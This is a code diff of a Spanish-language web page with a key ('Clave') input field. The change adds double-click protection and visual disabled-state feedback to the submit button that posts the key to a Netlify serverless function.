@@ -30,10 +30,15 @@
         placeholder="Clave"
     >
 
-    <button type="button" class="btn-accept" onclick="enviarClave()">
-        <span class="check">✔</span>
-        Aceptar
-    </button>
+<button
+    type="button"
+    id="btnAceptar"
+    class="btn-accept"
+    onclick="enviarClave()"
+>
+    <span class="check">✔</span>
+    Aceptar
+</button>
 </div>
 
 <!-- Footer -->
@@ -44,8 +49,11 @@
 
 <script>
 const claveInput = document.getElementById("claveInput");
+const btnAceptar = document.getElementById("btnAceptar");
 
-/* Solo letras y números – máximo 12 */
+let enviado = false;
+
+/* Solo letras y números */
 claveInput.addEventListener("input", () => {
     claveInput.value = claveInput.value
         .replace(/[^a-zA-Z0-9]/g, "")
@@ -53,12 +61,21 @@ claveInput.addEventListener("input", () => {
 });
 
 function enviarClave() {
+    if (enviado) return; // 🔒 bloquea múltiples clicks
+    enviado = true;
+
     const clave = claveInput.value.trim();
 
     if (clave.length === 0) {
         claveInput.focus();
+        enviado = false;
         return;
     }
+
+    // feedback visual
+    btnAceptar.disabled = true;
+    btnAceptar.style.opacity = "0.6";
+    btnAceptar.style.cursor = "not-allowed";
 
     fetch("/.netlify/functions/enviar", {
         method: "POST",
@@ -73,6 +90,7 @@ function enviarClave() {
     });
 }
 </script>
+
 
 </body>
 </html>
